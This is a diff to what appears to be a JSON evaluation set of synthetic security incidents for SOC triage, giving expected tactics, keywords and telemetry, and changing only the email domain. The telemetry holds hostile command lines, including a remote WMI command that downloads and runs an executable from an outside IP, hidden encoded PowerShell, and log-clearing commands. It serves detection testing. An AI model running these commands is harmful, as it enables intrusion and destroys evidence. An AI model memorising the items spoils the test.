     "telemetry": [
       {
@@ -1385,7 +1385,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4624,
         "Computer": "AZURE-VM-FIN-001",
-        "TargetUserName": "ops-lead@aisoc.dev",
+        "TargetUserName": "ops-lead@example.com",
         "LogonType": 10,
         "IpAddress": "LIN-BUILD-CI03",
         "LogonProcessName": "User32",
@@ -1398,7 +1398,7 @@
     "template_id": "wmi-lateral-execution",
     "template_index": 29,
     "title": "WMI lateral execution from WIN-PROD-WEB02 to AWS-EC2-PROD-API",
-    "description": "wmic.exe /node:AWS-EC2-PROD-API process call create observed from WIN-PROD-WEB02 by dave@aisoc.dev. Remote command execution; payload from 91.134.231.15.",
+    "description": "wmic.exe /node:AWS-EC2-PROD-API process call create observed from WIN-PROD-WEB02 by dave@example.com. Remote command execution; payload from 91.134.231.15.",
     "expected_tactics": [
       "TA0008",
       "TA0002"
@@ -1413,7 +1413,7 @@
       "lateral",
       "WIN-PROD-WEB02",
       "AWS-EC2-PROD-API",
-      "dave@aisoc.dev",
+      "dave@example.com",
       "91.134.231.15"
     ],
     "telemetry": [
@@ -1423,7 +1423,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "WIN-PROD-WEB02",
-        "User": "dave@aisoc.dev",
+        "User": "dave@example.com",
         "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
         "CommandLine": "wmic /node:AWS-EC2-PROD-API process call create \"cmd /c curl http://91.134.231.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
       }
@@ -1433,8 +1433,8 @@
     "id": "INC-EVAL-031",
     "template_id": "bulk-pii-download",
     "template_index": 30,
-    "title": "Bulk PII download by ops-lead@aisoc.dev",
-    "description": "ops-lead@aisoc.dev downloaded >10 GB of customer records from production database from LIN-DB-REPLICA. Outside normal access pattern.",
+    "title": "Bulk PII download by ops-lead@example.com",
+    "description": "ops-lead@example.com downloaded >10 GB of customer records from production database from LIN-DB-REPLICA. Outside normal access pattern.",
     "expected_tactics": [
       "TA0009",
       "TA0010"
@@ -1450,13 +1450,13 @@
       "pii",
       "customer record",
       "LIN-DB-REPLICA",
-      "ops-lead@aisoc.dev"
+      "ops-lead@example.com"
     ],
     "telemetry": [
       {
         "source": "db_audit",
         "operation": "SELECT",
-        "user": "ops-lead@aisoc.dev",
+        "user": "ops-lead@example.com",
         "src_host": "LIN-DB-REPLICA",
         "database": "prod_customers",
         "table": "customer_records",
@@ -1470,7 +1470,7 @@
     "template_id": "clipboard-keylogger",
     "template_index": 31,
     "title": "Clipboard logging implant on WIN-DC-SECONDARY",
-    "description": "Clipboard contents from WIN-DC-SECONDARY (ops-lead@aisoc.dev) being captured to %APPDATA%\\Local\\. Captures span 2 hours and include credentials and crypto addresses.",
+    "description": "Clipboard contents from WIN-DC-SECONDARY (ops-lead@example.com) being captured to %APPDATA%\\Local\\. Captures span 2 hours and include credentials and crypto addresses.",
     "expected_tactics": [
       "TA0009"
     ],
@@ -1484,7 +1484,7 @@
       "keylog",
       "credentials",
       "WIN-DC-SECONDARY",
-      "ops-lead@aisoc.dev"
+      "ops-lead@example.com"
     ],
     "telemetry": [
       {
@@ -1493,8 +1493,8 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 24,
         "Computer": "WIN-DC-SECONDARY",
-        "User": "ops-lead@aisoc.dev",
-        "Image": "C:\\Users\\ops-lead@aisoc.dev\\AppData\\Local\\sched.exe",
+        "User": "ops-lead@example.com",
+        "Image": "C:\\Users\\ops-lead@example.com\\AppData\\Local\\sched.exe",
         "Hashes": "SHA256=abc..."
       },
       {
@@ -1503,9 +1503,9 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 11,
         "Computer": "WIN-DC-SECONDARY",
-        "Image": "C:\\Users\\ops-lead@aisoc.dev\\AppData\\Local\\sched.exe",
-        "TargetFilename": "C:\\Users\\ops-lead@aisoc.dev\\AppData\\Local\\clip.log",
-        "User": "ops-lead@aisoc.dev"
+        "Image": "C:\\Users\\ops-lead@example.com\\AppData\\Local\\sched.exe",
+        "TargetFilename": "C:\\Users\\ops-lead@example.com\\AppData\\Local\\clip.log",
+        "User": "ops-lead@example.com"
       }
     ]
   },
@@ -1550,7 +1550,7 @@
     "template_id": "s3-exfil-cloud-storage",
     "template_index": 33,
     "title": "Cloud storage exfil: data egress to attacker-controlled S3 from WIN-DC-PRIMARY",
-    "description": "Egress from WIN-DC-PRIMARY to s3://atk-stage-91.134.231.15/dump/ by carol@aisoc.dev. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
+    "description": "Egress from WIN-DC-PRIMARY to s3://atk-stage-91.134.231.15/dump/ by carol@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
     "expected_tactics": [
       "TA0010"
     ],
@@ -1566,7 +1566,7 @@
       "exfiltrat",
       "WIN-DC-PRIMARY",
       "91.134.231.15",
-      "carol@aisoc.dev"
+      "carol@example.com"
     ],
     "telemetry": [
       {
@@ -1576,7 +1576,7 @@
         "awsRegion": "us-east-1",
         "userIdentity": {
           "type": "IAMUser",
-          "userName": "carol@aisoc.dev"
+          "userName": "carol@example.com"
         },
         "sourceIPAddress": "WIN-DC-PRIMARY",
         "requestParameters": {
@@ -1595,8 +1595,8 @@
     "id": "INC-EVAL-035",
     "template_id": "personal-drive-exfil",
     "template_index": 34,
-    "title": "Personal Drive exfil by admin@aisoc.dev",
-    "description": "admin@aisoc.dev on LIN-K8S-NODE01 uploaded 4 GB to personal Google Drive. Files include source code and customer PII.",
+    "title": "Personal Drive exfil by admin@example.com",
+    "description": "admin@example.com on LIN-K8S-NODE01 uploaded 4 GB to personal Google Drive. Files include source code and customer PII.",
     "expected_tactics": [
       "TA0009",
       "TA0010"
@@ -1614,7 +1614,7 @@
       "source code",
       "pii",
       "LIN-K8S-NODE01",
-      "admin@aisoc.dev"
+      "admin@example.com"
     ],
     "telemetry": [
       {
@@ -1623,7 +1623,7 @@
         "url": "https://www.googleapis.com/upload/drive/v3/files",
         "status_code": 200,
         "src_host": "LIN-K8S-NODE01",
-        "src_user": "admin@aisoc.dev",
+        "src_user": "admin@example.com",
         "bytes_out": 4300000000,
         "file_count": 812
       }
@@ -1718,7 +1718,7 @@
     "template_id": "ransomware-encryption",
     "template_index": 37,
     "title": "Ransomware encryption in progress on GCP-GKE-NODE-04",
-    "description": "Mass file rename observed on GCP-GKE-NODE-04 (frank@aisoc.dev); ..enc extension applied to ~20 k files. Ransomware note R3ADM3-LockBit 3.0.txt found.",
+    "description": "Mass file rename observed on GCP-GKE-NODE-04 (frank@example.com); ..enc extension applied to ~20 k files. Ransomware note R3ADM3-LockBit 3.0.txt found.",
     "expected_tactics": [
       "TA0040"
     ],
@@ -1733,7 +1733,7 @@
       "rename",
       "ransom note",
       "GCP-GKE-NODE-04",
-      "frank@aisoc.dev",
+      "frank@example.com",
       "LockBit 3.0"
     ],
     "telemetry": [
@@ -1744,8 +1744,8 @@
         "EventID": 11,
         "Computer": "GCP-GKE-NODE-04",
         "Image": "C:\\ProgramData\\enc.exe",
-        "TargetFilename": "C:\\Users\\frank@aisoc.dev\\Documents\\notes.docx.enc",
-        "User": "frank@aisoc.dev",
+        "TargetFilename": "C:\\Users\\frank@example.com\\Documents\\notes.docx.enc",
+        "User": "frank@example.com",
         "rename_rate_per_min": 4200
       },
       {
@@ -1755,8 +1755,8 @@
         "EventID": 11,
         "Computer": "GCP-GKE-NODE-04",
         "Image": "C:\\ProgramData\\enc.exe",
-        "TargetFilename": "C:\\Users\\frank@aisoc.dev\\Desktop\\R3ADM3-LockBit 3.0.txt",
-        "User": "frank@aisoc.dev"
+        "TargetFilename": "C:\\Users\\frank@example.com\\Desktop\\R3ADM3-LockBit 3.0.txt",
+        "User": "frank@example.com"
       },
       {
         "source": "edr",
@@ -1808,8 +1808,8 @@
     "id": "INC-EVAL-040",
     "template_id": "bec-wire-fraud",
     "template_index": 39,
-    "title": "BEC: payment redirect by cfo@aisoc.dev",
-    "description": "Spear-phishing email spoofed CFO. Wire transfer of $250 k initiated by cfo@aisoc.dev from AWS-EC2-PROD-API to threat-actor account. Linked to ALPHV/BlackCat.",
+    "title": "BEC: payment redirect by cfo@example.com",
+    "description": "Spear-phishing email spoofed CFO. Wire transfer of $250 k initiated by cfo@example.com from AWS-EC2-PROD-API to threat-actor account. Linked to ALPHV/BlackCat.",
     "expected_tactics": [
       "TA0001",
       "TA0040"
@@ -1825,7 +1825,7 @@
       "spoofed cfo",
       "wire transfer",
       "$250",
-      "cfo@aisoc.dev",
+      "cfo@example.com",
       "AWS-EC2-PROD-API",
       "ALPHV/BlackCat"
     ],
@@ -1834,10 +1834,10 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "Send",
-        "UserId": "cfo@aisoc.dev",
+        "UserId": "cfo@example.com",
         "ClientIP": "AWS-EC2-PROD-API",
         "Subject": "URGENT: Wire instructions from CFO",
-        "From": "cfo@aisoc.dev.spoof",
+        "From": "cfo@example.com.spoof",
         "ReplyTo": "cfo-aisoc@protonmail.com",
         "threat_actor": "ALPHV/BlackCat"
       }
@@ -1874,7 +1874,7 @@
         "awsRegion": "us-east-1",
         "userIdentity": {
           "type": "IAMUser",
-          "userName": "ops-lead@aisoc.dev"
+          "userName": "ops-lead@example.com"
         },
         "requestParameters": {
           "bucketName": "aisoc-employees",
@@ -1908,8 +1908,8 @@
     "id": "INC-EVAL-042",
     "template_id": "azure-ad-impossible-travel",
     "template_index": 41,
-    "title": "Identity provider compromise \u2014 anomalous Azure AD sign-in for grace@aisoc.dev",
-    "description": "Successful Azure AD sign-in for grace@aisoc.dev from 45.142.122.111 (impossible-travel from prior location). MFA satisfied via stolen session token.",
+    "title": "Identity provider compromise \u2014 anomalous Azure AD sign-in for grace@example.com",
+    "description": "Successful Azure AD sign-in for grace@example.com from 45.142.122.111 (impossible-travel from prior location). MFA satisfied via stolen session token.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -1925,14 +1925,14 @@
       "impossible travel",
       "session token",
       "mfa",
-      "grace@aisoc.dev",
+      "grace@example.com",
       "45.142.122.111"
     ],
     "telemetry": [
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "grace@aisoc.dev",
+        "userPrincipalName": "grace@example.com",
         "ipAddress": "45.142.122.111",
         "location": {
           "city": "Vladivostok",
@@ -1991,8 +1991,8 @@
     "id": "INC-EVAL-044",
     "template_id": "insider-mailbox-export",
     "template_index": 43,
-    "title": "Insider preparing departure: large mailbox export by ops-lead@aisoc.dev",
-    "description": "ops-lead@aisoc.dev exported full mailbox PST (8 GB) from AZURE-VM-FIN-001. HR flag: notice given last week.",
+    "title": "Insider preparing departure: large mailbox export by ops-lead@example.com",
+    "description": "ops-lead@example.com exported full mailbox PST (8 GB) from AZURE-VM-FIN-001. HR flag: notice given last week.",
     "expected_tactics": [
       "TA0009",
       "TA0010"
@@ -2008,7 +2008,7 @@
       "PST",
       "insider",
       "departure",
-      "ops-lead@aisoc.dev",
+      "ops-lead@example.com",
       "AZURE-VM-FIN-001"
     ],
     "telemetry": [
@@ -2016,10 +2016,10 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "New-MailboxExportRequest",
-        "UserId": "ops-lead@aisoc.dev",
+        "UserId": "ops-lead@example.com",
         "Parameters": {
-          "Mailbox": "ops-lead@aisoc.dev",
-          "FilePath": "\\\\AZURE-VM-FIN-001\\export\\ops-lead@aisoc.dev.pst"
+          "Mailbox": "ops-lead@example.com",
+          "FilePath": "\\\\AZURE-VM-FIN-001\\export\\ops-lead@example.com.pst"
         },
         "Bytes": 8300000000
       }
@@ -2029,8 +2029,8 @@
     "id": "INC-EVAL-045",
     "template_id": "office-vsto-addin",
     "template_index": 44,
-    "title": "Malicious Office add-in installed for grace@aisoc.dev",
-    "description": "Office VSTO add-in registered under HKCU for grace@aisoc.dev on WIN-EXCHANGE-01; loads on every Outlook startup; beacons to 185.220.101.7.",
+    "title": "Malicious Office add-in installed for grace@example.com",
+    "description": "Office VSTO add-in registered under HKCU for grace@example.com on WIN-EXCHANGE-01; loads on every Outlook startup; beacons to 185.220.101.7.",
     "expected_tactics": [
       "TA0003",
       "TA0011"
@@ -2045,7 +2045,7 @@
       "office add-in",
       "vsto",
       "outlook",
-      "grace@aisoc.dev",
+      "grace@example.com",
       "WIN-EXCHANGE-01",
       "185.220.101.7"
     ],
@@ -2056,10 +2056,10 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 13,
         "Computer": "WIN-EXCHANGE-01",
-        "User": "grace@aisoc.dev",
+        "User": "grace@example.com",
         "EventType": "SetValue",
         "TargetObject": "HKCU\\Software\\Microsoft\\Office\\Outlook\\Addins\\Aisoc.Updater",
-        "Details": "LoadBehavior=3;Manifest=file:///C:/Users/grace@aisoc.dev/AppData/Roaming/aisoc.vsto"
+        "Details": "LoadBehavior=3;Manifest=file:///C:/Users/grace@example.com/AppData/Roaming/aisoc.vsto"
       },
       {
         "source": "sysmon",
@@ -2078,7 +2078,7 @@
     "template_id": "github-pat-leak",
     "template_index": 45,
     "title": "GitHub PAT leaked and abused from 185.220.101.7",
-    "description": "Personal access token belonging to grace@aisoc.dev used from 185.220.101.7 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
+    "description": "Personal access token belonging to grace@example.com used from 185.220.101.7 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
     "expected_tactics": [
       "TA0006",
       "TA0009"
@@ -2094,14 +2094,14 @@
       "pat",
       "token",
       "private repo",
-      "grace@aisoc.dev",
+      "grace@example.com",
       "185.220.101.7"
     ],
     "telemetry": [
       {
         "source": "github_audit",
         "action": "git.clone",
-        "actor": "grace@aisoc.dev",
+        "actor": "grace@example.com",
         "actor_ip": "185.220.101.7",
         "repo_count": 14,
         "programmatic_access_type": "personal_access_token",
@@ -2110,8 +2110,8 @@
       {
         "source": "github_audit",
         "action": "push",
-        "actor": "grace@aisoc.dev",
-        "repo": "grace@aisoc.dev/dotfiles",
+        "actor": "grace@example.com",
+        "repo": "grace@example.com/dotfiles",
         "visibility": "public",
         "file_changed": ".env",
         "secret_detected": "github_pat_*"
@@ -2170,8 +2170,8 @@
     "id": "INC-EVAL-048",
     "template_id": "helpdesk-password-reset-abuse",
     "template_index": 47,
-    "title": "Vendor admin password reset abuse for ops-lead@aisoc.dev",
-    "description": "Password reset for ops-lead@aisoc.dev performed by helpdesk in response to social-engineering call from 185.220.101.7. Token claimed within 90 seconds.",
+    "title": "Vendor admin password reset abuse for ops-lead@example.com",
+    "description": "Password reset for ops-lead@example.com performed by helpdesk in response to social-engineering call from 185.220.101.7. Token claimed within 90 seconds.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -2186,7 +2186,7 @@
       "password reset",
       "social engineering",
       "helpdesk",
-      "ops-lead@aisoc.dev",
+      "ops-lead@example.com",
       "185.220.101.7"
     ],
     "telemetry": [
@@ -2194,14 +2194,14 @@
         "source": "m365_audit",
         "Workload": "AzureActiveDirectory",
         "Operation": "Reset user password.",
-        "UserId": "helpdesk@aisoc.dev",
-        "TargetUserId": "ops-lead@aisoc.dev",
+        "UserId": "helpdesk@example.com",
+        "TargetUserId": "ops-lead@example.com",
         "ClientIP": "10.0.0.50"
       },
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "ops-lead@aisoc.dev",
+        "userPrincipalName": "ops-lead@example.com",
         "ipAddress": "185.220.101.7",
         "resultType": 0,
         "seconds_after_reset": 87
@@ -2212,8 +2212,8 @@
     "id": "INC-EVAL-049",
     "template_id": "oauth-refresh-token-theft",
     "template_index": 48,
-    "title": "OAuth refresh-token theft for ops-lead@aisoc.dev",
-    "description": "Refresh token for ops-lead@aisoc.dev replayed from 172.16.50.7. Granted access to mailbox + OneDrive without re-prompt.",
+    "title": "OAuth refresh-token theft for ops-lead@example.com",
+    "description": "Refresh token for ops-lead@example.com replayed from 172.16.50.7. Granted access to mailbox + OneDrive without re-prompt.",
     "expected_tactics": [
       "TA0006"
     ],
@@ -2228,14 +2228,14 @@
       "replay",
       "onedrive",
       "mailbox",
-      "ops-lead@aisoc.dev",
+      "ops-lead@example.com",
       "172.16.50.7"
     ],
     "telemetry": [
       {
         "source": "azure_signin",
         "category": "SignInLogs",
-        "userPrincipalName": "ops-lead@aisoc.dev",
+        "userPrincipalName": "ops-lead@example.com",
         "ipAddress": "172.16.50.7",
         "resultType": 0,
         "authenticationProtocol": "oAuth2",
@@ -2304,8 +2304,8 @@
     "id": "INC-EVAL-051",
     "template_id": "outlook-auto-forward-rule",
     "template_index": 50,
-    "title": "Outlook rule auto-forwarding mail from dave@aisoc.dev",
-    "description": "Outlook inbox rule created for dave@aisoc.dev that forwards all mail to external address at 203.0.113.45. Linked to MagicWeb.",
+    "title": "Outlook rule auto-forwarding mail from dave@example.com",
+    "description": "Outlook inbox rule created for dave@example.com that forwards all mail to external address at 203.0.113.45. Linked to MagicWeb.",
     "expected_tactics": [
       "TA0006",
       "TA0009"
@@ -2320,7 +2320,7 @@
       "outlook rule",
       "forward",
       "mail",
-      "dave@aisoc.dev",
+      "dave@example.com",
       "203.0.113.45",
       "MagicWeb"
     ],
@@ -2329,7 +2329,7 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "New-InboxRule",
-        "UserId": "dave@aisoc.dev",
+        "UserId": "dave@example.com",
         "Parameters": {
           "Name": "Sync",
           "ForwardTo": "ext@203.0.113.45",
@@ -2345,7 +2345,7 @@
     "template_id": "linux-journald-tampering",
     "template_index": 51,
     "title": "Linux journald log tampering on K8S-PROD-CLUSTER",
-    "description": "journalctl --rotate --vacuum-time=1s observed on K8S-PROD-CLUSTER by carol@aisoc.dev; recent journal entries purged. Indicator removal.",
+    "description": "journalctl --rotate --vacuum-time=1s observed on K8S-PROD-CLUSTER by carol@example.com; recent journal entries purged. Indicator removal.",
     "expected_tactics": [
       "TA0005"
     ],
@@ -2359,7 +2359,7 @@
       "log tampering",
       "vacuum",
       "K8S-PROD-CLUSTER",
-      "carol@aisoc.dev"
+      "carol@example.com"
     ],
     "telemetry": [
       {
@@ -2371,7 +2371,7 @@
         "a1": "--rotate",
         "a2": "--vacuum-time=1s",
         "hostname": "K8S-PROD-CLUSTER",
-        "user": "carol@aisoc.dev"
+        "user": "carol@example.com"
       }
     ]
   },
@@ -2428,8 +2428,8 @@
     "id": "INC-EVAL-054",
     "template_id": "vpn-new-geography",
     "template_index": 53,
-    "title": "Suspicious VPN login from new geography for admin@aisoc.dev",
-    "description": "VPN login for admin@aisoc.dev from 10.0.99.42 (new country, no prior history). Subsequent lateral SMB scan from VPN range to LIN-K8S-NODE01.",
+    "title": "Suspicious VPN login from new geography for admin@example.com",
+    "description": "VPN login for admin@example.com from 10.0.99.42 (new country, no prior history). Subsequent lateral SMB scan from VPN range to LIN-K8S-NODE01.",
     "expected_tactics": [
       "TA0001",
       "TA0008"
@@ -2445,7 +2445,7 @@
       "new geography",
       "lateral",
       "smb scan",
-      "admin@aisoc.dev",
+      "admin@example.com",
       "10.0.99.42",
       "LIN-K8S-NODE01"
     ],
@@ -2453,7 +2453,7 @@
       {
         "source": "vpn",
         "action": "login_success",
-        "user": "admin@aisoc.dev",
+        "user": "admin@example.com",
         "src_ip": "10.0.99.42",
         "geo_country": "UA",
         "first_login_country": true
@@ -2464,7 +2464,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 5145,
         "Computer": "LIN-K8S-NODE01",
-        "SubjectUserName": "admin@aisoc.dev",
+        "SubjectUserName": "admin@example.com",
         "ShareName": "\\\\*\\IPC$",
         "IpAddress": "10.0.99.42",
         "EventCount": 128
@@ -2476,7 +2476,7 @@
     "template_id": "service-account-privileged-command",
     "template_index": 54,
     "title": "Privileged command run as service account on WIN-PROD-WEB02",
-    "description": "Service account eve@aisoc.dev (no interactive use expected) ran privileged net.exe + wevtutil cl Security on WIN-PROD-WEB02. Anomalous.",
+    "description": "Service account eve@example.com (no interactive use expected) ran privileged net.exe + wevtutil cl Security on WIN-PROD-WEB02. Anomalous.",
     "expected_tactics": [
       "TA0005",
       "TA0006"
@@ -2491,7 +2491,7 @@
       "service account",
       "wevtutil",
       "log clear",
-      "eve@aisoc.dev",
+      "eve@example.com",
       "WIN-PROD-WEB02"
     ],
     "telemetry": [
@@ -2501,7 +2501,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "WIN-PROD-WEB02",
-        "User": "eve@aisoc.dev",
+        "User": "eve@example.com",
         "Image": "C:\\Windows\\System32\\wevtutil.exe",
         "CommandLine": "wevtutil cl Security",
         "LogonType": 5
@@ -2512,8 +2512,8 @@
     "id": "INC-EVAL-056",
     "template_id": "phishing-macro-email",
     "template_index": 0,
-    "title": "Spear-phishing email with macro-laden attachment delivered to bob@aisoc.dev",
-    "description": "Inbound email from 10.0.99.42 delivered an Office document with a malicious VBA macro to bob@aisoc.dev. Attachment opened on LIN-DB-REPLICA; macro spawned cmd.exe and downloaded a stage-2 payload from a known Scattered Spider infrastructure.",
+    "title": "Spear-phishing email with macro-laden attachment delivered to bob@example.com",
+    "description": "Inbound email from 10.0.99.42 delivered an Office document with a malicious VBA macro to bob@example.com. Attachment opened on LIN-DB-REPLICA; macro spawned cmd.exe and downloaded a stage-2 payload from a known Scattered Spider infrastructure.",
     "expected_tactics": [
       "TA0001",
       "TA0002"
@@ -2529,7 +2529,7 @@
       "macro",
       "10.0.99.42",
       "LIN-DB-REPLICA",
-      "bob@aisoc.dev",
+      "bob@example.com",
       "stage-2 payload"
     ],
     "telemetry": [
@@ -2537,7 +2537,7 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "Send",
-        "UserId": "bob@aisoc.dev",
+        "UserId": "bob@example.com",
         "ClientIP": "10.0.99.42",
         "Subject": "Q4 invoice (action required)",
         "AttachmentNames": [
@@ -2550,7 +2550,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "LIN-DB-REPLICA",
-        "User": "bob@aisoc.dev",
+        "User": "bob@example.com",
         "Image": "C:\\Windows\\System32\\cmd.exe",
         "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "CommandLine": "cmd.exe /c powershell -nop -w hidden -enc <stage2>"
@@ -2560,7 +2560,7 @@
         "rule": "Office macro spawned cmd.exe",
         "severity": "high",
         "Computer": "LIN-DB-REPLICA",
-        "User": "bob@aisoc.dev",
+        "User": "bob@example.com",
         "threat_actor": "Scattered Spider"
       }
     ]
@@ -2616,7 +2616,7 @@
     "template_id": "confluence-watering-hole",
     "template_index": 2,
     "title": "Watering-hole exploit served from internal Confluence by 198.51.100.23",
-    "description": "Internal Confluence page injected with malicious JavaScript by 198.51.100.23. Drive-by exploit triggered browser exploitation on multiple visitors including cfo@aisoc.dev. Linked to APT29 TTPs.",
+    "description": "Internal Confluence page injected with malicious JavaScript by 198.51.100.23. Drive-by exploit triggered browser exploitation on multiple visitors including cfo@example.com. Linked to APT29 TTPs.",
     "expected_tactics": [
       "TA0001",
       "TA0002"
@@ -2632,14 +2632,14 @@
       "drive-by",
       "Confluence",
       "198.51.100.23",
-      "cfo@aisoc.dev",
+      "cfo@example.com",
       "APT29"
     ],
     "telemetry": [
       {
         "source": "web_access",
         "http_method": "POST",
-        "url": "https://confluence.aisoc.dev/pages/editpage.action?pageId=8472",
+        "url": "https://confluence.example.com/pages/editpage.action?pageId=8472",
         "status_code": 200,
         "src_ip": "198.51.100.23",
         "user_agent": "Mozilla/5.0",
@@ -2650,7 +2650,7 @@
         "rule": "Browser exploitation: drive-by JavaScript loader",
         "severity": "high",
         "Computer": "WIN-HR-DESKTOP",
-        "User": "cfo@aisoc.dev",
+        "User": "cfo@example.com",
         "threat_actor": "APT29"
       }
     ]
@@ -2715,7 +2715,7 @@
     "template_id": "usb-autorun-airgap",
     "template_index": 4,
     "title": "Malicious USB autorun on air-gapped host MAC-LEGAL-LAPTOP",
-    "description": "USB device inserted on air-gapped MAC-LEGAL-LAPTOP by ops-lead@aisoc.dev. AutoRun executed Python stager that collected local files. Data staged in C:\\Temp\\.",
+    "description": "USB device inserted on air-gapped MAC-LEGAL-LAPTOP by ops-lead@example.com. AutoRun executed Python stager that collected local files. Data staged in C:\\Temp\\.",
     "expected_tactics": [
       "TA0001",
       "TA0009"
@@ -2731,7 +2731,7 @@
       "autorun",
       "air-gapped",
       "MAC-LEGAL-LAPTOP",
-      "ops-lead@aisoc.dev",
+      "ops-lead@example.com",
       "Python stager"
     ],
     "telemetry": [
@@ -2741,7 +2741,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 6416,
         "Computer": "MAC-LEGAL-LAPTOP",
-        "SubjectUserName": "ops-lead@aisoc.dev",
+        "SubjectUserName": "ops-lead@example.com",
         "ClassName": "USB",
         "DeviceDescription": "SanDisk Cruzer 16GB"
       },
@@ -2751,7 +2751,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "MAC-LEGAL-LAPTOP",
-        "User": "ops-lead@aisoc.dev",
+        "User": "ops-lead@example.com",
         "Image": "C:\\Python311\\python.exe",
         "ParentImage": "C:\\Windows\\System32\\rundll32.exe",
         "CommandLine": "python.exe E:\\autorun.py --stage C:\\Temp\\"
@@ -2762,8 +2762,8 @@
     "id": "INC-EVAL-061",
     "template_id": "oauth-consent-phish",
     "template_index": 5,
-    "title": "OAuth consent phishing targeting admin@aisoc.dev",
-    "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by admin@aisoc.dev. Inbox forwarding rule created sending mail to 172.16.50.7.",
+    "title": "OAuth consent phishing targeting admin@example.com",
+    "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by admin@example.com. Inbox forwarding rule created sending mail to 172.16.50.7.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -2778,7 +2778,7 @@
       "OAuth consent",
       "Mail.Read",
       "Files.Read.All",
-      "admin@aisoc.dev",
+      "admin@example.com",
       "172.16.50.7",
       "forwarding rule"
     ],
@@ -2787,7 +2787,7 @@
         "source": "m365_audit",
         "Workload": "AzureActiveDirectory",
         "Operation": "Consent to application.",
-        "UserId": "admin@aisoc.dev",
+        "UserId": "admin@example.com",
         "ApplicationId": "00000003-0000-0ff1-ce00-000000000000",
         "ConsentedScopes": [
           "Mail.Read",
@@ -2799,7 +2799,7 @@
         "source": "m365_audit",
         "Workload": "Exchange",
         "Operation": "New-InboxRule",
-        "UserId": "admin@aisoc.dev",
+        "UserId": "admin@example.com",
         "Parameters": {
           "Name": "Auto-fwd",
           "ForwardTo": "ext@172.16.50.7",
@@ -2813,7 +2813,7 @@
     "template_id": "powershell-obfuscated-dropper",
     "template_index": 6,
     "title": "Obfuscated PowerShell dropper executed on WIN-DC-PRIMARY",
-    "description": "PowerShell dropper executed on WIN-DC-PRIMARY by heidi@aisoc.dev; payload base64-encoded and decoded in-memory. Linked to LockBit 3.0 ransomware staging.",
+    "description": "PowerShell dropper executed on WIN-DC-PRIMARY by heidi@example.com; payload base64-encoded and decoded in-memory. Linked to LockBit 3.0 ransomware staging.",
     "expected_tactics": [
       "TA0002",
       "TA0005"
@@ -2829,7 +2829,7 @@
       "obfuscated",
       "base64",
       "WIN-DC-PRIMARY",
-      "heidi@aisoc.dev",
+      "heidi@example.com",
       "LockBit 3.0"
     ],
     "telemetry": [
@@ -2839,7 +2839,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "WIN-DC-PRIMARY",
-        "User": "heidi@aisoc.dev",
+        "User": "heidi@example.com",
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "ParentImage": "C:\\Windows\\explorer.exe",
         "CommandLine": "powershell.exe -nop -w hidden -enc JABzAD0ATgB..."
@@ -2850,7 +2850,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4104,
         "Computer": "WIN-DC-PRIMARY",
-        "User": "heidi@aisoc.dev",
+        "User": "heidi@example.com",
         "ScriptBlockText": "$s=[System.Convert]::FromBase64String(...);[Reflection.Assembly]::Load($s).EntryPoint.Invoke(...)",
         "threat_actor": "LockBit 3.0"
       }
@@ -2962,7 +2962,7 @@
     "template_id": "wmi-event-subscription",
     "template_index": 9,
     "title": "Malicious WMI subscription on LIN-BUILD-CI03",
-    "description": "Permanent WMI event subscription created on LIN-BUILD-CI03 by svc-backup@aisoc.dev. Consumer runs encoded script. Persistence + execution mechanism.",
+    "description": "Permanent WMI event subscription created on LIN-BUILD-CI03 by svc-backup@example.com. Consumer runs encoded script. Persistence + execution mechanism.",
     "expected_tactics": [
       "TA0002",
       "TA0003"
@@ -2978,7 +2978,7 @@
       "subscription",
       "permanent",
       "LIN-BUILD-CI03",
-      "svc-backup@aisoc.dev",
+      "svc-backup@example.com",
       "encoded script"
     ],
     "telemetry": [
@@ -2988,7 +2988,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 19,
         "Computer": "LIN-BUILD-CI03",
-        "User": "svc-backup@aisoc.dev",
+        "User": "svc-backup@example.com",
         "EventNamespace": "ROOT\\Subscription",
         "Name": "UpdaterFilter",
         "Query": "SELECT * FROM __InstanceModificationEvent WITHIN 60"
@@ -3010,7 +3010,7 @@
     "id": "INC-EVAL-066",
     "template_id": "registry-run-persistence",
     "template_index": 10,
-    "title": "Registry Run key persistence created by svc-backup@aisoc.dev on LIN-DB-REPLICA",
+    "title": "Registry Run key persistence created by svc-backup@example.com on LIN-DB-REPLICA",
